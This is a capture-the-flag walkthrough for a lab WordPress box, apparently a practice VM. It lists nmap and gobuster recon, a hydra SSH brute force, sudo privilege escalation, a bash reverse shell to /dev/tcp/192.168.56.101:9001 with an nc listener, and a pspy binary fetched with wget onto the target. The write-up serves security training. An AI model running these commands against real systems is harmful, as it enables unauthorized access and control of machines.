# Capture the Flag Walkthrough

## Initial Setup

### Attacker Machine
- Kali Linux with two network adapters:
  - Host-only adapter (for target machine connection)
  - NAT adapter (for internet access)

### Target Machine
- Vulnerable machine with one Host-only network adapter
- Note: Host-only networking handles DHCP automatically

## Finding the Target

1. **Identify Kali machine's IP address:**
```bash
hostname -I
```

2. **Scan network for target machine:**
```bash
sudo nmap -v --min-rate 10000 $targetIP/24 | grep open
```
> Replace $targetIP with your Kali machine's private IP

3. **Detailed target scan:**
```bash
sudo nmap -v -sV -sC -oN nmap $targetIP
```
Parameters:
- `-v`: Verbose output
- `-sV`: Service versioning
- `-sC`: Script scan for vulnerabilities
- `-oN`: Save output to "nmap" file

## Analyzing the Website

1. **Access target website:**
   - Navigate to `http://$targetIP`

2. **Inspect source code:**
   - Look for WordPress indicators
   - Check for dns-prefetch tag (//s.w.org)

3. **Fix DNS resolution:**
   - Add to /etc/hosts:
```bash
$targetIP    redrocks.win
```

## Uncovering the Backdoor

1. **Explore website:**
   - Check "Hello Blue" link
   - Look for "Looking For It?" message

2. **Use Gobuster for backdoor discovery:**
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
  -x .php -u http://redrocks.win/ -o dir80.txt -z
```

## Exploitation Steps

### Initial Access
```bash
hydra -l john -P passlist.txt 192.168.56.102 ssh
sshpass -p 'CURRENT_PASSWORD' ssh john@192.168.56.102
```

### Privilege Escalation Setup
```bash
sudo -u ippsec /usr/bin/time /bin/bash
cd /dev/shm/
```

### Creating Reverse Shell
1. **Create shell script:**
```bash
echo '#!/bin/bash
bash -c '\''bash -i >& /dev/tcp/192.168.56.101/9001 0>&1'\''' > shell.sh
chmod +x shell.sh
```

2. **Set up listener (on attacking machine):**
```bash
nc -lvnp 9001
```

3. **Execute shell (on target machine):**
```bash
./shell.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Terminal Stabilization
```bash
# Press ctrl+z
stty raw -echo;fg
# Press ENTER twice
export TERM=xterm
```

## Advanced Privilege Escalation with pspy

### On Attacking Machine
```bash
# Download pspy (using v1.2.0 due to GLIBC compatibility)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

# Start temporary HTTP server
python3 -m http.server 80
```

### On Target Machine
```bash
wget [TARGETMACHINE IP]/pspy64s
chmod +x pspy64s
./pspy64s
```

## Important Notes
- Always ensure you have proper authorization before performing penetration testing
- These commands should be used responsibly and ethically
- Some steps may need to be adjusted based on specific target configurations
- Always verify commands before execution to prevent unintended consequences

[Additional steps to be documented based on specific CTF requirements]
